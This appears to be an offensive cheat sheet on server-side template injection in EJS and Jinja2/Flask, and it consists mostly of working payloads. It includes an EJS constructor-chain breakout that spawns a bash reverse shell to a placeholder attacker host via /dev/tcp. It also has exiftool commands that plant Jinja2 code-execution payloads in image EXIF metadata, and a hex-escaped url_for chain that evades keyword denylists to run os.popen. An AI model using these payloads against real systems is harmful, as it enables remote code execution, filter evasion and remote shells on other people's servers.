# SSTI

EJS: confirm with `<%= guest %>` in any user-editable template preview, then break out to RCE via the constructor chain.

```bash
# confirm engine evaluates input
<%= guest %>

# EJS breakout -> process -> child_process spawn (reverse shell)
<%= this.constructor.constructor("return process")().mainModule.require("child_process").spawn("bash", ["-c", "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"]) %>
```

Jinja2/Flask: any field that gets reflected back through a template render is worth probing — even unusual ones like EXIF metadata on an uploaded image, if the app shows a preview page that renders the image's own metadata:
```bash
exiftool -Artist='{{7*7}}' image.jpg        # upload/re-check preview -> 49 confirms the engine evaluates it
exiftool -Artist="{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}" image.jpg
```

Keyword-denylist bypass, two angles: a case-sensitive filter blocking `{{env}}`/`{{7*7}}` literally still misses `{{ ENV }}` or other-case variants; a filter blocking the obvious globals (`request`, `lipsum`, `cycler`, `joiner`, `namespace`, `self`, `config`) can still be reached via `url_for`, with every blocked attribute name hex-escaped so the keyword never appears as a literal substring:
```
{{url_for|attr("\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f")|attr("\x67\x65\x74")("\x6f\x73")|attr("\x70\x6f\x70\x65\x6e")("\x69\x64")|attr("\x72\x65\x61\x64")()}}
```
That decodes to `url_for.__globals__.get("os").popen("id").read()` — any Jinja2 global function (not just `url_for`) works as the entry point if `request`/`self` specifically are blocked.

